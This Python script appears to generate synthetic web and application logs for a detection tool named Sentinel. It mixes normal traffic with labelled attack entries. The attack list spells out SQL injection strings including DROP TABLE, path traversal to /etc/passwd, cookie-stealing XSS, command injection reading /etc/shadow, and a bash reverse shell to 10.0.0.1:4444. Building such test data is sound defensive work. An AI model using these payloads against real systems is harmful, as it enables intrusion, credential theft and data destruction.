"""Synthetic log generator for Sentinel.

Generates realistic web server and application logs in normal, attack,
mixed, and high-throughput benchmark modes.
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

# Normal traffic pools
NORMAL_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/products/item?id=101",
    "/products/item?id=205", "/api/v1/health", "/api/v1/metrics", "/api/v1/products",
    "/api/v1/users/profile", "/login", "/logout", "/dashboard", "/static/css/main.css",
    "/static/js/bundle.js", "/static/img/logo.png", "/cart", "/checkout", "/search?q=laptop",
    "/search?q=shoes", "/blog/posts/2026-update", "/faq", "/pricing", "/terms"
]

NORMAL_IPS = [
    "192.168.1.15", "192.168.1.22", "192.168.1.45", "10.0.0.12", "10.0.0.88",
    "172.16.0.4", "172.16.0.99", "64.233.160.1", "157.240.22.35", "13.107.4.52",
    "198.51.100.42", "203.0.113.195", "198.51.100.77"
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

NORMAL_APP_MESSAGES = [
    "User authentication succeeded for uid=8412",
    "Session token refreshed successfully",
    "Database query executed in 1.4ms (table: orders)",
    "Payment gateway callback processed: status=200",
    "Cache hit for key 'product:inventory:1042'",
    "Rendered view templates/home.html in 12ms",
    "Job queue worker completed task 'email_welcome'",
    "Health check ping received from load balancer: OK",
    "Cart updated: added sku=9941 qty=1",
    "PDF invoice generated for order #48911 in 84ms",
]

# Attack traffic pools
ATTACK_TEMPLATES = [
    # SQL Injections
    ("GET", "/products?id=1' UNION SELECT username, password_hash FROM users--", 500, "SQL Injection (UNION SELECT)"),
    ("GET", "/login?user=admin' OR '1'='1'--&pass=foo", 500, "SQL Injection (Authentication Bypass)"),
    ("POST", "/api/v1/search?term=test'; DROP TABLE customers;--", 500, "SQL Injection (DROP TABLE)"),
    ("GET", "/item?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", 500, "SQL Injection (Schema Extraction)"),
    ("GET", "/search?id=1; WAITFOR DELAY '0:0:5'--", 500, "Blind SQL Injection (Time Delay)"),

    # Path Traversals
    ("GET", "/static/../../../../etc/passwd", 403, "Path Traversal (etc/passwd)"),
    ("GET", "/download?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", 403, "Path Traversal (Windows system32)"),
    ("GET", "/view?page=../../../../boot.ini", 404, "Path Traversal (boot.ini)"),

    # XSS (Cross-Site Scripting)
    ("GET", "/search?q=<script>alert('XSS-ATTACK-VECTOR')</script>", 400, "Reflected XSS (<script>)"),
    ("POST", "/comments?msg=<img src=x onerror=alert(document.cookie)>", 400, "Stored XSS (onerror img)"),
    ("GET", "/profile?bio=<svg/onload=eval(atob('ZmV0Y2goLi4uKQ=='))>", 400, "SVG Stored XSS"),

    # Remote Code Execution / Shell Injection
    ("POST", "/admin/ping?host=127.0.0.1; cat /etc/shadow", 500, "Command Injection (cat /etc/shadow)"),
    ("GET", "/cgi-bin/test.cgi?cmd=powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-WebRequest'", 500, "Command Injection (powershell)"),
    ("GET", "/api/exec?eval=os.system('/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')", 500, "Remote Code Execution (eval bash)"),

    # Application level bursts of 500 errors
    ("POST", "/api/v1/checkout", 500, "Database Connection Pool Exhaustion: java.sql.SQLException: Connection refused"),
    ("GET", "/api/v1/internal/crash", 500, "FATAL NullPointerException: critical internal service unhandled crash in worker"),
]


def generate_normal_log(log_format: str = "nginx") -> str:
    """Generates a realistic normal log line."""
    ip = random.choice(NORMAL_IPS)
    now = datetime.now()

    if log_format == "custom_app":
        level = "INFO"
        if random.random() < 0.05:
            level = "WARN"
        timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
        method = random.choice(["GET", "POST", "GET", "GET"])
        path = random.choice(NORMAL_PATHS)
        status = 200 if level == "INFO" else random.choice([301, 304, 404])
        msg = random.choice(NORMAL_APP_MESSAGES)
        return f"{timestamp} {level} {ip} {method} {path} {status} {msg}"

    # Default: nginx combined format
    timestamp = now.strftime("%d/%b/%Y:%H:%M:%S +0000")
    method = random.choice(["GET", "GET", "GET", "POST", "HEAD"])
    path = random.choice(NORMAL_PATHS)
    status = random.choice([200, 200, 200, 200, 201, 204, 301, 304, 404])
    bytes_sent = random.randint(240, 8192)
    user_agent = random.choice(NORMAL_USER_AGENTS)
    referer = "https://example.com" if random.random() > 0.3 else "-"
    return f'{ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {bytes_sent} "{referer}" "{user_agent}"'


def generate_attack_log(log_format: str = "nginx") -> tuple[str, str]:
    """Generates a realistic anomalous/attack log line with label."""
    attacker_ip = f"198.51.100.{random.randint(10, 240)}"
    now = datetime.now()
    method, path, status, attack_type = random.choice(ATTACK_TEMPLATES)

    if log_format == "custom_app":
        timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
        level = "ERROR" if status >= 500 else "WARN"
        msg = f"Security Exception detected: {attack_type} payload='{path}'"
        line = f"{timestamp} {level} {attacker_ip} {method} {path} {status} {msg}"
        return line, attack_type

    timestamp = now.strftime("%d/%b/%Y:%H:%M:%S +0000")
    bytes_sent = random.randint(120, 850)
    user_agent = "sqlmap/1.8#stable (https://sqlmap.org)" if "SQL" in attack_type else "Mozilla/5.0 (compatible; SecurityScanner/2.1)"
    line = f'{attacker_ip} - - [{timestamp}] "{method} {path} HTTP/1.1" {status} {bytes_sent} "-" "{user_agent}"'
    return line, attack_type


def generate_to_file(
    output_path: Path | str,
    count: int = 1000,
    mode: str = "normal",
    delay: float = 0.0,
    log_format: str = "nginx",
    anomaly_rate: float = 0.05,
) -> None:
    """Writes logs to file either in bulk or as a live stream."""
    path = Path(output_path)
    path.parent.mkdir(parents=True, exist_ok=True)

    mode = mode.lower()
    infinite = (count <= 0)
    written = 0

    print(f"[*] Starting log generator: mode={mode}, count={'unlimited' if infinite else count}, output='{path}'")

    # Use append mode so we don't blow away existing content if desired, or write mode for fresh batch
    with open(path, "a", encoding="utf-8") as f:
        try:
            while infinite or written < count:
                if mode == "normal":
                    line = generate_normal_log(log_format)
                elif mode == "attack":
                    line, _ = generate_attack_log(log_format)
                elif mode == "mixed":
                    if random.random() < anomaly_rate:
                        line, _ = generate_attack_log(log_format)
                    else:
                        line = generate_normal_log(log_format)
                elif mode == "high-volume":
                    # Generate normal logs at maximum throughput
                    line = generate_normal_log(log_format)
                else:
                    line = generate_normal_log(log_format)

                f.write(line + "\n")
                f.flush()
                written += 1

                if delay > 0:
                    time.sleep(delay)
                elif mode != "high-volume" and delay == 0 and not infinite:
                    pass  # write as fast as possible for batch files

        except KeyboardInterrupt:
            print(f"\n[!] Generator stopped by user after writing {written} lines.")

    print(f"[+] Completed writing {written} log entries to '{path}'.")


def main() -> None:
    """CLI entrypoint for log generation."""
    parser = argparse.ArgumentParser(description="Sentinel Synthetic Log Generator")
    parser.add_argument("--output", "-o", default="data/app.log", help="Path to write log output")
    parser.add_argument("--mode", "-m", choices=["normal", "attack", "mixed", "high-volume"], default="normal", help="Generation mode")
    parser.add_argument("--count", "-c", type=int, default=1000, help="Number of lines to generate (<=0 for infinite stream)")
    parser.add_argument("--delay", "-d", type=float, default=0.0, help="Delay between lines in seconds (default: 0.0)")
    parser.add_argument("--format", "-f", choices=["nginx", "custom_app"], default="nginx", help="Log format style")
    parser.add_argument("--anomaly-rate", type=float, default=0.05, help="Proportion of attacks in mixed mode (default: 0.05)")

    args = parser.parse_args()
    generate_to_file(
        output_path=args.output,
        count=args.count,
        mode=args.mode,
        delay=args.delay,
        log_format=args.format,
        anomaly_rate=args.anomaly_rate,
    )


if __name__ == "__main__":
    main()
